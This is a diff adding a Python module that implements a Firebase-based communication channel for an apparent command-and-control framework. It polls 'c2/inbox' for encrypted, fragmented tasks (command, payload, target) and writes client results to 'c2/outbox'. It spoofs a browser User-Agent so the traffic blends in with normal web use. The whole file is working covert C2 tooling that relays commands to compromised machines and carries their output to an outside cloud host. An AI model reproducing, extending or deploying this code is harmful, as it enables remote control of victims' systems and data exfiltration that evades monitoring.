@@ -1,0 +1,171 @@
+import os
+
+import requests
+
+import common
+from channel.base import Channel
+
+_UA = (
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+    "AppleWebKit/537.36 (KHTML, like Gecko) "
+    "Chrome/124.0.0.0 Safari/537.36"
+)
+
+_HEADERS = {
+    "User-Agent":      _UA,
+    "Accept":          "application/json",
+    "Accept-Language": "en-US,en;q=0.9",
+    "Accept-Encoding": "gzip, deflate, br",
+}
+
+
+def _entry_key(data: dict) -> str:
+    """Derive a unique Firebase key from a data row.
+
+    Non-fragment rows use command_id as the key.
+    Fragment rows (status="frag:N:T") use "{command_id}_f{N}" so that
+    multiple fragments for the same command don't overwrite each other.
+    """
+    cmd_id = data.get("command_id", "unknown")
+    status = data.get("status", "")
+    if status.startswith("frag:"):
+        parts = status.split(":")
+        try:
+            return f"{cmd_id}_f{int(parts[1])}"
+        except (IndexError, ValueError):
+            pass
+    return cmd_id
+
+
+class FirebaseChannel(Channel):
+    def __init__(self):
+        super().__init__()
+        # Firebase REST polling is faster than CSV export — 3s default.
+        self._refresh_interval = 3.0
+
+    # ------------------------------------------------------------------
+    # URL helpers
+    # ------------------------------------------------------------------
+
+    def _base(self) -> str:
+        return os.environ["FIREBASE_URL"].rstrip("/")
+
+    def _inbox_url(self, suffix: str = "") -> str:
+        path = os.environ.get("FIREBASE_INBOX_PATH", "c2/inbox").strip("/")
+        return f"{self._base()}/{path}{suffix}.json"
+
+    def _outbox_url(self, suffix: str = "") -> str:
+        path = os.environ.get("FIREBASE_OUTBOX_PATH", "c2/outbox").strip("/")
+        return f"{self._base()}/{path}{suffix}.json"
+
+    # ------------------------------------------------------------------
+    # Low-level REST operations
+    # ------------------------------------------------------------------
+
+    def _read(self, url: str) -> list:
+        """GET a Firebase path. Returns list of decrypted row dicts."""
+        try:
+            resp = requests.get(url, headers=_HEADERS, timeout=15)
+            resp.raise_for_status()
+            data = resp.json()
+            if not data:
+                return []
+            enc = common.get_encryptor()
+            rows = []
+            for entry in data.values():
+                if isinstance(entry, dict):
+                    rows.append(common._decrypt_row(entry, enc))
+            return rows
+        except Exception as e:
+            print(f"[error] Firebase read failed: {e}")
+            return []
+
+    def _write(self, url: str, data: dict) -> bool:
+        """PUT a dict to a Firebase path. Returns True on success."""
+        enc = common.get_encryptor()
+        encrypted = common._encrypt_row(data, enc)
+        try:
+            resp = requests.put(url, json=encrypted, headers=_HEADERS, timeout=15)
+            return resp.ok
+        except Exception as e:
+            print(f"[error] Firebase write failed: {e}")
+            return False
+
+    def _delete(self, url: str) -> bool:
+        """DELETE a Firebase path. Returns True on success."""
+        try:
+            resp = requests.delete(url, headers=_HEADERS, timeout=15)
+            return resp.ok
+        except Exception as e:
+            print(f"[error] Firebase delete failed: {e}")
+            return False
+
+    # ------------------------------------------------------------------
+    # Channel interface
+    # ------------------------------------------------------------------
+
+    def read_inbox(self) -> list:
+        rows = self._read(self._inbox_url())
+        return common._reassemble_fragments(rows, "payload", "pending")
+
+    def read_outbox(self) -> list:
+        rows = self._read(self._outbox_url())
+        return common._reassemble_fragments(rows, "result", "success")
+
+    def write_task(self, data: dict) -> bool:
+        url = self._inbox_url(f"/{_entry_key(data)}")
+        return self._write(url, data)
+
+    def write_result(self, data: dict) -> bool:
+        url = self._outbox_url(f"/{_entry_key(data)}")
+        return self._write(url, data)
+
+    # ------------------------------------------------------------------
+    # Cleanup — Firebase supports DELETE unlike Sheets
+    # ------------------------------------------------------------------
+
+    @property
+    def supports_cleanup(self) -> bool:
+        return True
+
+    def delete_task(self, command_id: str) -> bool:
+        """Delete an inbox entry by command_id.
+        Note: only deletes the primary entry key. Fragment keys ({id}_fN)
+        are left in place and cleaned up on the next scheduled clear.
+        """
+        return self._delete(self._inbox_url(f"/{command_id}"))
+
+    def delete_result(self, command_id: str) -> bool:
+        """Delete an outbox entry by command_id."""
+        return self._delete(self._outbox_url(f"/{command_id}"))
+
+    # ------------------------------------------------------------------
+    # Fragment builders
+    # ------------------------------------------------------------------
+
+    def build_outbox_fragments(self, data: dict, chunks: list) -> list:
+        total = len(chunks)
+        return [
+            {
+                "command_id": data["command_id"],
+                "client_id":  data.get("client_id", ""),
+                "status":     f"frag:{i}:{total}",
+                "result":     chunk,
+                "timestamp":  data.get("timestamp", ""),
+            }
+            for i, chunk in enumerate(chunks)
+        ]
+
+    def build_inbox_fragments(self, data: dict, chunks: list) -> list:
+        total = len(chunks)
+        return [
+            {
+                "command_id": data["command_id"],
+                "command":    data.get("command", ""),
+                "payload":    chunk,
+                "target":     data.get("target", ""),
+                "status":     f"frag:{i}:{total}",
+                "created_at": data.get("created_at", ""),
+            }
+            for i, chunk in enumerate(chunks)
+        ]
